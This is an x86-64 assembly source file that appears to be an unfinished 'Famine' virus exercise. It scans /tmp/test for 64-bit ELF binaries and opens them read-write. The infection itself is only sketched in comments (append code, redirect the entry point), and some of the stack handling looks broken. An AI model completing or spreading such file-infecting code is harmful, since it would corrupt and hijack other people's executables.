%define SYS_READ    0
%define SYS_WRITE   1
%define SYS_OPEN	2
%define SYS_CLOSE   3
%define SYS_CHDIR   80
%define SYS_EXIT    60
%define NULL        0

%define BARRA_N     10

;debug
section .data
    hello db 'Hello, World!', BARRA_N, NULL
    newline db  BARRA_N, NULL
;debug

section .text
    global _start

_start:
    mov r14, [rsp + 8] ; argv0
	push rdx
	push rsp
	sub rsp, 6900 ; by substracting 6900 from rsp, we can access the 6900 bytes before the stack pointer (malloc but on stack)
	mov r15, rsp ; r15 = malloc(6900)

    lea rdi, [rel folder1] ; rdi = "/tmp/test"
    call open_dir ; change directory to "/tmp/test"

    call getdents

    xor rcx, rcx ; rcx = 0

    call iterate_loop ; iterate over directory entries

    call hello_world  ; print "Hello, World!"

    call restore_stack ; exit

open_dir:
    mov rax, SYS_OPEN ; syscall number for sys_open
    mov rsi, 0 ; O_RDONLY
    syscall ; invoke operating system to open directory
    test rax, rax ; check for error
    js safe_exit ; if error, exit
    ret

getdents:
    mov rdi, rax ; save file descriptor
    mov rax, 217 ; syscall number for sys_getdents64
    lea rsi, [r15 + 400] ; buffer to store directory entries
    mov rdx, 1024 ; size of buffer
    syscall ; invoke operating system to read directory entries
    test rax, rax ; check for error
    js safe_exit ; if error, exit

    mov qword [r15 + 350], rax ; save number of bytes read
    mov rax, SYS_CLOSE ; syscall number for sys_close
    syscall ; invoke operating system to close directory

    ret

iterate_loop:

    push rcx
    cmp byte [r15 + 418 + rcx], 8 ; check if d_type is DT_REG
    jne .go_to_next
    

    lea rdi, [rcx + r15 + 419] ; filename
    mov rsi, 2 ; O_RDWR
    mov rdx, 0 ; mode
    mov rax, SYS_OPEN ; syscall number for sys_open
    syscall ; invoke operating system to open file
    ; call open_file ; open file
    mov r9, rax ; save file descriptor
    cmp rax, 0 ; check for error
    jbe .go_to_next ; if error, go to next entry


    ; read ehdr

    call pread ; read ELF header
    ; test rax, rax ; check for error
    ; jz .go_to_next ; if error, go to next entry


    ; mov rsi, r15 ; save ELF header address
    ; add rsi, 144 ; point to ELF header
    ; mov rdx, 16
    ; call print_bytes

    call hello_world  ; print "Hello, World!"

    ; check if it's an ELF file
    cmp dword [r15 + 144], 0x464c457f ; check if it's an ELF file (magic number)
    jnz .close_file ; if not, go to next entry

    call hello_world  ; print "Hello, World!"


    cmp byte [r15 + 148], 0x2 ; check if it's a 64-bit ELF file
    jne .close_file ; if not, go to next entry

    ; iterate over sections to find PT_NOTE

    ; infect
        ; for infection i must append virus to the file, then i must
        ; modify the entry point to point to the virus
        ; then i must modify the virus to jump to the original entry point

    ; close file

.close_file:
    mov rax, SYS_CLOSE ; syscall number for sys_close
    mov rdi, r9 ; file descriptor
    syscall ; invoke operating system to close file

.go_to_next:
    pop rcx
    add cx, word [rcx + r15 + 416]
    cmp rcx, qword [r15 + 350]
    jne iterate_loop

; all entries done
call restore_stack ; exit

open_file:
    lea rdi, [rcx + r15 + 419] ; filename
    mov rsi, 2 ; O_RDWR
    mov rdx, 0 ; mode
    mov rax, SYS_OPEN ; syscall number for sys_open
    syscall ; invoke operating system to open file
    ret

pread:
    mov rdi, r9 ; file descriptor (use the correct file descriptor)
    lea rsi, [r15 + 144] ; buffer to store ELF header
    mov rdx, 64 ; size of ELF header
    mov r10, 0 ; offset (start of the file)
    mov rax, 17 ; syscall number for sys_pread64
    syscall ; invoke operating system to read ELF header
    ret

print_bytes:
    ; rsi points to the bytes to print
    ; rdx is the number of bytes to print
    mov rax, SYS_WRITE
    mov rdi, 1 ; stdout
    syscall
    ret

close_dir:
    call restore_stack ; exit
    ret

print_string:
    ; Print string pointed to by rdi
    mov rax, SYS_WRITE ; syscall number for sys_write
    mov rdi, 1 ; file descriptor (stdout)
    mov rdx, 256 ; max length
    syscall
    ret


; if code arrives here it's a segfault 100%
foo: ;find the string when doing strings on the binary
    db "Que me quedo sin comer by gemitareste", NULL

;debug
hello_world:
; PRINT
    mov rax, 1 ; syscall number for sys_write
    mov rdi, 1 ; file descriptor 1 is stdout
    lea rsi, [rel hello] ; address of string to output
    mov rdx, 14 ; number of bytes
    syscall ; invoke operating system to do the write
    ret
; PRINT
;debug

new_line:
    mov rax, 1 ; syscall number for sys_write
    mov rdi, 1 ; file descriptor 1 is stdout
    lea rsi, [rel newline] ; address of string to output
    mov rdx, 1 ; number of bytes
    syscall ; invoke operating system to do the write
    ret

restore_stack:
    pop rsp ; restore the stack pointer
    pop rdx ; restore rdx

safe_exit:
    mov rax, SYS_EXIT ; syscall number for sys_exit
    xor rdi, rdi ; exit code 0
    syscall ; invoke operating system to exit


folder1 db "/tmp/test", NULL
folder2 db "/tmp/test2", NULL

signature db "Famine project coded by gemitareste", NULL